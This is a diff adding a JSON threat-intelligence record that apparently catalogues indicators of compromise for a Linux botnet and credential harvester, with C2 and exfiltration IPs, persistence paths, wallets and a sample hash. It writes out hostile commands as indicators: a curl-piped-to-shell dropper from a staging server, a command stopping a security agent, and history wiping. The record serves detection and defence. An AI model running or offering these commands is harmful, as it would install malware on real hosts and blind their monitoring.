@@ -1,0 +1,321 @@
+{
+  "malware_family": "Linux Botnet/Harvester",
+  "threat_actor": "Actor B / Actor C",
+  "platforms": [
+    "linux"
+  ],
+  "summary": "Threat actors, tracked as Actor B and C, compromised a Linux system via CVE-2025-55182 (React2Shell) to deploy a multi-revenue botnet and credential harvester. The malware uses cron jobs, systemd services, and UDEV rules for persistence while running cryptominers, selling bandwidth, and exfiltrating sensitive data. The campaign uses several custom scripts and ELF binaries downloaded from staging servers.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "curl -fsSLk http://162.55.234.175:4082/workersh | sh",
+      "context": "Initial dropper execution via curl piped to shell.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "systemctl stop huntress-updater.service",
+      "context": "Attacker attempt to disable Huntress agent.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "history -c 2>/dev/null",
+      "context": "Log cleanup command executed by Actor B.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/etc/cron.d/auto-upgrade",
+      "context": "Malicious root cron job for persistence, downloads payloads daily.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/.config/systemd/user/.arpupdate.service",
+      "context": "Hidden systemd user service for Actor B persistence.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/.config/systemd/user/.dnsupdate.service",
+      "context": "Second hidden systemd user service for Actor B persistence.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/dev/health",
+      "context": "Watchdog script to kill competing miners.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/.e2933fc3b.sh",
+      "context": "Data collection and exfiltration script.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/corn",
+      "context": "Path for repeated wget download of installsh.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/defunctr",
+      "context": "Path for repeated wget download of dnser.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/var/tmp/systemd-logind",
+      "context": "Actor A's XMRig-based cryptominer binary.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "XMRig",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "workersh",
+      "context": "Initial shell dropper for Actor B components.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "installsh",
+      "context": "Miner installer script dropped by workersh.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "dnser",
+      "context": "ELF binary, likely DNS-tunneling C2 component.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "fkkkf",
+      "context": "XMRig cryptominer binary run by Actor B.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "XMRig",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "FH8a7d7M",
+      "context": "Additional XMR cryptominer binary in /tmp/.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "48jWtAsev4V9iDeN5TK5PQVNGhnJJR35yiJfJ1tbA3f73ZCiiarUxc4RMU4hNMsd1Udjbe1tCiBeFbx216UXXJzLB98dmJR",
+      "context": "Monero wallet associated with Actor B's mining.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "3090ae2d-e49e-4626-a752-9222911f4970",
+      "context": "EarnFM API key used by Actor B.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "workoutoffice@protonmail.com",
+      "context": "Repocket account email used by Actor B.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "poop",
+      "context": "Actor B's XMRig miner pool password.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "@reboot /var/tmp/systemd-logind",
+      "context": "crontab persistence for Actor A's miner.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "0x1x2x3.top",
+      "context": "C2 domain used by root cron job /etc/cron.d/auto-upgrade.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "pool.supportxmr.com:3333",
+      "context": "Monero mining pool used by Actor B's fkkkf miner.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://162.55.234.175:4082/workersh",
+      "context": "URL used to download the initial dropper script.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/workersh",
+      "context": "URI path for the initial dropper script.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "162.55.234.175:4082",
+      "context": "Actor B staging/C2 server for botnet payloads.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "147.45.41.25:80",
+      "context": "Actor C staging IP to fetch next-stage payloads.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "172.86.127.128:8080",
+      "context": "Exfiltration endpoint for data posted via wget.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "172.245.159.216:80",
+      "context": "Actor C staging/C2 IP used for follow-on malware.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "57.129.119.218:19999",
+      "context": "Private Monero mining pool for FH8a7d7M cryptominer.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "62.60.246.210:443",
+      "context": "Private Monero mining pool used by Actor A.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "169.254.169.254",
+      "context": "Cloud metadata endpoint queried for exfiltration.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "781c19b56fbdb17284707f9026e107f639e5447df7df3b248a5d5a50c4b0806c",
+      "description": "Credential-harvesting and exfiltration script /tmp/.e2933fc3b.sh."
+    }
+  ],
+  "file_types": [
+    "script",
+    "elf"
+  ]
+}
